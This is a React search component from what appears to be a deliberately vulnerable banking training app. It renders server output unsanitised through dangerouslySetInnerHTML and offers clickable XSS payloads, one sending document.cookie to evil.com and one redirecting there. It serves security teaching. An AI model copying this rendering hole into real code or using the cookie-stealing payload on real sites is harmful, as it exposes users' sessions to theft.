import React, { useState } from 'react';
import axios from 'axios';

function Search() {
  const [query, setQuery] = useState('');
  const [results, setResults] = useState([]);
  const [message, setMessage] = useState('');
  const [isLoading, setIsLoading] = useState(false);

  const handleSearch = async (e) => {
    e.preventDefault();
    setIsLoading(true);
    try {
      const user = JSON.parse(localStorage.getItem('user'));
      const response = await axios.get('/api/search', {
        params: { q: query },
        headers: { 'x-user-id': user?.id }
      });
      setResults(response.data.results || []);
      setMessage(response.data.message);
    } catch (error) {
      console.error('Search error:', error);
      setMessage('Error performing search');
    } finally {
      setIsLoading(false);
    }
  };

  const xssPayloads = [
    { name: "Alert Box", payload: "<script>alert('XSS Vulnerability Found!')</script>" },
    { name: "Cookie Stealer", payload: "<img src=x onerror=fetch('http://evil.com?cookie='+document.cookie)>" },
    { name: "Page Redirect", payload: "<script>window.location='https://evil.com'</script>" }
  ];

  return (
    <div className="search-container">
      <div className="page-header">
        <div>
          <h2>🔍 Transaction Search</h2>
          <p>Search your transaction history</p>
        </div>
        <div className="vuln-badge high">⚠️ REFLECTED XSS VULNERABLE</div>
      </div>

      <div className="warning-box critical">
        <strong>⚠️ SECURITY WARNING</strong>
        <p>This search function is vulnerable to Reflected XSS attacks. Any JavaScript you enter will execute in your browser!</p>
      </div>

      <div className="xss-test-section">
        <h3>🎯 XSS Test Payloads (Click to test)</h3>
        <div className="payload-grid">
          {xssPayloads.map((payload, i) => (
            <button 
              key={i}
              className="payload-btn"
              onClick={() => {
                setQuery(payload.payload);
                setTimeout(() => handleSearch({ preventDefault: () => {} }), 100);
              }}
            >
              {payload.name}
            </button>
          ))}
        </div>
      </div>

      <form onSubmit={handleSearch} className="search-form">
        <div className="search-input-group">
          <input
            type="text"
            value={query}
            onChange={(e) => setQuery(e.target.value)}
            placeholder="Search by description, amount, or date..."
            className="search-input"
          />
          <button type="submit" disabled={isLoading} className="search-btn">
            {isLoading ? 'Searching...' : '🔍 Search'}
          </button>
        </div>
      </form>

      {message && (
        <div className="search-message">
          <div dangerouslySetInnerHTML={{ __html: message }} />
        </div>
      )}

      {results.length > 0 && (
        <div className="results-container">
          <h3>📋 Search Results ({results.length})</h3>
          <div className="results-table">
            <table>
              <thead>
                <tr><th>Date</th><th>Description</th><th>Amount</th><th>Type</th></tr>
              </thead>
              <tbody>
                {results.map((result, i) => (
                  <tr key={i}>
                    <td>{result.date}</td>
                    <td>{result.description}</td>
                    <td className={result.type === 'credit' ? 'positive' : 'negative'}>
                      {result.type === 'credit' ? '+' : '-'}${Math.abs(result.amount).toLocaleString()}
                    </td>
                    <td><span className={`badge ${result.type === 'credit' ? 'badge-success' : 'badge-warning'}`}>
                      {result.type}
                    </span></td>
                  </tr>
                ))}
              </tbody>
            </table>
          </div>
        </div>
      )}

      <div className="info-box">
        <h4>💡 How Reflected XSS Works:</h4>
        <p>1. Attacker crafts malicious link: <code>/search?q=&lt;script&gt;alert('XSS')&lt;/script&gt;</code></p>
        <p>2. Victim clicks the link</p>
        <p>3. Server reflects the script back without sanitization</p>
        <p>4. Script executes in victim's browser</p>
      </div>
    </div>
  );
}

export default Search;
